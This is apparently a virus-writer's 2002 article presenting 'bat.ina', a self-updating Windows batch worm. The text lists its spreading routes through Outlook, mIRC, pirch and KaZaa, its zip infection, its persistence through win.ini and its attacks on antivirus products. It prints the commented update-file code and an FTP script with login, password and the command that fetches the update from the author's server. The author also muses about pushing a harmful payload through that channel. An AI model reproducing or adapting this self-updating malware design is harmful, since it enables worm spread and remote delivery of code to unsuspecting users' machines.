Here I am again, the crazy batch-guy. This was written with
the only reason, that it hasn't been written before:
This is the first batch virus, that is able to update itself
via the internet. Just proof of concept. It was written
September 2002, completely while I was in work ... have not
much to do there :) I think it's my 15th virus, and it hasn't
been written for a zine, and not for the wild. If a zine takes
it for releasing, good. If not, it will never be released ;]
I want to say some special thanks to one of the most important
persons in my life: Ina ... This is for you.
Well ... I think I'm going to smoke something now :]
Here are some facts:
-is able to update itself via the internet using ftp
-Outlook worm (with the help of a quite common vbs)
 subject: hehe, isn't that fascinating...
 body: ... I just want to say something to the attachment:
       It is the first ever batch virus, that is able to
       update itself via the internet! Hehe, you don't
       have to execute it (if you don't want to ;),
       but if you understand a bit batch, look at it,
       it's really interesting!
-mIRC worm
-pirch worm
-KaZaa worm
-infects zip-files
-"residency" through win.ini
-retro: Norton AntiVirus 2000, AntiVir /9X Personal Edition,
 F-Prot 95, McAfee, Thunderbyte
-payload: message-payload:
 message-box:
 this is a tribute to one of the most important persons in my current life.
 (hehe, i couldn't think of another name)
 and it is the first ever batch virus, that is able to update itself via the internet.
 title: bat.ina
-fully compatible to Windows ME, Windows 98, Windows 95 (has been tested)
-size: 5.011 bytes
-AV-names: BAT_INA.A, INA.A, VBS_INA.A

And here is an example for an update-file.
Everything should be clear, code is again already commented.

=====[begin code]===============================================================
:: bat.ina update-file
:: by philet0ast3r [rRlf]
:: if downloaded by bat.ina, this file gets executed as c:\updatecheck.bat

@echo off
ctty nul
del %winbootdir%\anitab1a.sig
:: this is the signature-file of the original virus
:: newer versions would delete all known signature-files

if exist %winbootdir%\*.sig goto end
:: if there's nevertheless a .sig-file, it means there's already a newer version installed
:: (as this is only proof of concept, there will probably be no new version)

echo this file is important>%winbootdir%\anitab1a.sig
:: the running version writes its signature-file

echo @echo off>ud
echo echo (this could be some new code)>>ud
echo :end>>ud
move ud %winbootdir%\update.bat
:: this is now the code of the new virus
:: if it is in fact a new version, it gets installed
:: (as said before, there will probably be no updates,
:: so this contains no code, but is just an example)

call %winbootdir%\update.bat
:end

=====[end code]================================================================

Here are the debuged ftp commands, for downloading the update.
If you want to "hack" and abuse my ftp, do it ... it has no worth for me.
You would just be lame.
... As I finished the virus, I submitted it to Trend Micro.
They said, they blocked the ftp ... Well, until now, I can still access
the page, and the example-update-file ... Perhaps I should really put it
in the wild, and place some silent dcc-send or an other evil thing
as update-file :)) Perhaps then they would really do something, not just talk.
As my father always said:
First there has to happen something, before something happens.

=====[begin code]===============================================================
batina_rrlf
fuuuck
get update.txt
quit
=====[end code]================================================================

That's all, ppl. Hope this enjoyed you a bit.
And remember, batch is in no way dead yet...

Something you want to tell me? ... Equal what:
